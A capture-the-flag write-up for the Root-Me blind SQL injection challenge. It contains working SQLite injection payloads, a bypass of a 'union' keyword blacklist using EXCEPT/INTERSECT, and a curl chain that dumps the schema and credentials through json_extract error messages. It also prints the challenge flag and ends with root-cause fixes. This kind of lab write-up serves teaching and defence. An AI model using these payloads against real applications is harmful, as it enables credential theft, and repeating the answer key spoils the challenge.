# Root-Me — Web-Server / SQL injection - Blind (ch10)

- **Target:** http://challenge01.root-me.org/web-serveur/ch10/
- **Class:** SQL injection — blind (authentication bypass)
- **Author / date:** g0uZ, 27 Feb 2011
- **Goal:** retrieve the administrator password

## Flag

```
e2azO93i
```

Byte-exact confirmation (`hex()` of the stored value):

```
6532617A4F393369  ->  e2azO93i      (8 bytes, no trailing whitespace)
```

Verified by effect — logging in with `admin` / `e2azO93i` returns
`Welcome back admin`.

## Recovered data

| Item | Value |
|---|---|
| Table | `users` |
| Columns | `username TEXT, password TEXT, Year INTEGER` (3 columns — see note) |
| Row `user1` | `DsD6z756f$!` |
| Row `admin` | **`e2azO93i`** |
| Row `user2` | `Z28gsya65ze34def` |

Full schema recovered via `sqlite_master`:

```sql
CREATE TABLE users (username TEXT, password TEXT, Year INTEGER)
```

## The vulnerable code

The page is a plain login form posting `username` and `password`. Both fields are
concatenated **raw** into an SQLite query — the classic error is visible the moment
you send a single quote:

```
Warning: SQLite3::query(): Unable to prepare statement: 1, unrecognized token: "'''"
         in /challenge/web-serveur/ch10/index.php on line 39
```

The `'''` is the tell: our `'` was appended to the literal `'` in the SQL, with no
escaping at all. Reconstructing from behaviour:

```php
$q = "SELECT * FROM users WHERE username='$username' AND password='$password'";
$r = $db->query($q);          // line 39
if ($row = $r->fetchArray()) {
    echo "Welcome back {$row['username']} !";
    echo "- username : {$row['username']}";
} else {
    echo "Error : no such user/password";
}
```

The response echoes only `username`, which is why the challenge is framed as *blind* —
you never see the password column directly.

## The blacklist (and how it was mapped)

A naive WAF sits in front of the query. Differential probes mapped it exactly:

| Payload (in `password`) | Response | Reading |
|---|---|---|
| `' union select 1 -- ` | `Injection detected !` | `union` is blacklisted |
| `' UNION SELECT 1 -- ` | `Injection detected !` | check is **case-insensitive** |
| `' union -- ` | `Injection detected !` | keyword alone is enough |
| `' select 1 -- ` | SQLite syntax error at `select` | `select` reaches the DB |
| `' from -- ` | SQLite syntax error at `from` | `from` reaches the DB |
| `' where -- ` | SQLite syntax error at `where` | `where` reaches the DB |
| `' OR 1=1 -- ` | `Welcome back user1` | `or` allowed |
| `' AND 1=1 -- ` | `Error : no such user/password` | `and` allowed |
| `' EXCEPT SELECT 1,2 -- ` | `Error` (valid SQL) | **`except` allowed** |
| `' INTERSECT SELECT 1,2 -- ` | `Error` (valid SQL) | **`intersect` allowed** |

So the filter is effectively `stripos($input, 'union') !== false` — it blocks one word
and nothing else. Both `username` and `password` pass through it (injecting `union` in
either field trips it).

The blacklist is trivially bypassable: SQLite's **`EXCEPT`** and **`INTERSECT`** are the
same set operators as `UNION` and are not filtered. `EXCEPT SELECT 1,2` returned a clean
column-count error, proving the operator works — which also gave us the column count:

```
' EXCEPT SELECT 1   --  -> "SELECTs to the left and right of EXCEPT do not have the same number of result columns"
' EXCEPT SELECT 1,2 --  -> valid (no error)
```

### Side note on column count

`SELECT *` from `users` yields **3** columns (`username`, `password`, `Year`), yet
`EXCEPT SELECT 1,2` was accepted while `EXCEPT SELECT 1,2,3` errored. That means the
left-hand query is **not** `SELECT *` — it selects exactly 2 columns, e.g.
`SELECT username, password FROM users WHERE ...`. Minor detail, but it is the kind of
thing that costs time if you assume `SELECT *`.

## The oracle

Two independent oracles were available; both were used.

**1. Boolean blind (the intended path).** With `-- ` commenting out the rest of the query:

```
username = ' OR <condition> --     password = anything
=> SELECT * FROM users WHERE username='' OR <condition> -- ' AND password='...'
```

| Condition | Response |
|---|---|
| true | `Welcome back user1 !` |
| false | `Error : no such user/password` |

**2. Error-based (much faster, and what actually solved it).** SQLite ships with the
**JSON1** extension. `json_extract()` validates its path argument and, on failure,
emits an error that **contains the offending path**:

```
JSON path error near '<path>'
```

Because the path argument can be a subquery, any scalar value in the database is
reflected straight into the error message — turning a blind injection into a
full read primitive in a single request:

```
password = ' OR json_extract('{}',(SELECT username FROM users LIMIT 1)) -- 
=> JSON path error near 'user1'
```

No character-by-character loop, no timing. One request per value.

## Exploit chain

```bash
U="http://challenge01.root-me.org/web-serveur/ch10/"

# 1. Confirm injection + engine (single quote)
curl -s -X POST --data-urlencode "username=admin" --data-urlencode "password='" "$U"
#    -> SQLite3::query(): ... unrecognized token: "'''"  (index.php line 39)

# 2. Auth bypass sanity check
curl -s -X POST --data-urlencode "username=admin" --data-urlencode "password=' OR '1'='1" "$U"
#    -> Welcome back user1 !

# 3. Dump the schema (error-based)
curl -s -X POST --data-urlencode "username=zzz" \
  --data-urlencode "password=' OR json_extract('{}',(SELECT group_concat(sql) FROM sqlite_master)) -- " "$U"
#    -> JSON path error near 'CREATE TABLE users (username TEXT, password TEXT, Year INTEGER)'

# 4. Dump every credential at once
curl -s -X POST --data-urlencode "username=zzz" \
  --data-urlencode "password=' OR json_extract('{}',(SELECT group_concat(username||':'||password,'|') FROM users)) -- " "$U"
#    -> JSON path error near 'user1:DsD6z756f$!|admin:e2azO93i|user2:Z28gsya65ze34def'

# 5. Isolate the admin password
curl -s -X POST --data-urlencode "username=zzz" \
  --data-urlencode "password=' OR json_extract('{}',(SELECT password FROM users WHERE username='admin')) -- " "$U"
#    -> JSON path error near 'e2azO93i'

# 6. Byte-exact check
curl -s -X POST --data-urlencode "username=zzz" \
  --data-urlencode "password=' OR json_extract('{}',(SELECT hex(password) FROM users WHERE username='admin')) -- " "$U"
#    -> JSON path error near '6532617A4F393369'
```

## Negative controls

| # | Probe | Expected | Observed |
|---|---|---|---|
| 1 | `admin` / `e2azO93j` (wrong last char) | rejected | `Error : no such user/password` |
| 2 | `admin` / `e2azO93i` (recovered) | accepted | `Welcome back admin` |
| 3 | `zzz` / `' OR 1=2 -- ` | false branch | `Error : no such user/password` |
| 4 | `zzz` / `' OR 1=1 -- ` | true branch | `Welcome back user1` |
| 5 | `admin` / `'` | raw concatenation, no escaping | `unrecognized token: "'''"` |
| 6 | `zzz` / `' UNION SELECT 1,2 -- ` | filter fires | `Injection detected !` |

Control 1 is the important one: a one-character change to the recovered password flips
the result. Combined with the `hex()` output (8 bytes, no trailing space), this rules out
a lucky guess or a whitespace artefact.

## Root cause

1. **String concatenation into SQL.** User input is interpolated directly into the query
   string with zero escaping or parameter binding. One quote is all it takes.
2. **Blacklist instead of parameterisation.** The WAF blocks exactly one token (`union`).
   Blacklists are the wrong primitive: SQLite's `EXCEPT` and `INTERSECT` are functionally
   equivalent to `UNION` and sail straight through.
3. **Verbose errors in production.** `display_errors` is on and PHP warnings expose the
   absolute script path and line number. Worse, SQLite's `json_extract()` error reflects
   the *database value* passed as its path — a textbook error-based exfiltration channel.
4. **Plaintext passwords.** The `password` column holds cleartext (`e2azO93i`,
   `DsD6z756f$!`), so any read primitive is a total compromise.

## Fix

- **Prepared statements**, always — this is the whole fix for the injection:

  ```php
  $st = $db->prepare("SELECT username FROM users WHERE username = :u AND password = :p");
  $st->bindValue(':u', $_POST['username'], SQLITE3_TEXT);
  $st->bindValue(':p', $_POST['password'], SQLITE3_TEXT);
  $r = $st->execute();
  ```

  Note that `SQLite3::prepare()` was already being used in the vulnerable code — the
  injection exists purely because values were concatenated into the *string* rather than
  bound to placeholders. The safe API was one refactor away.

- **Stop leaking errors:** `display_errors=Off` in production, log server-side instead.
- **Hash passwords** (`password_hash()` / Argon2id) and compare with `password_verify()`.
  With hashed storage, a read primitive leaks a hash rather than the credential.
- If a WAF is kept at all, treat it as defence-in-depth, never as the control. A
  single-keyword blacklist should not be the thing standing between an attacker and the
  credential store.
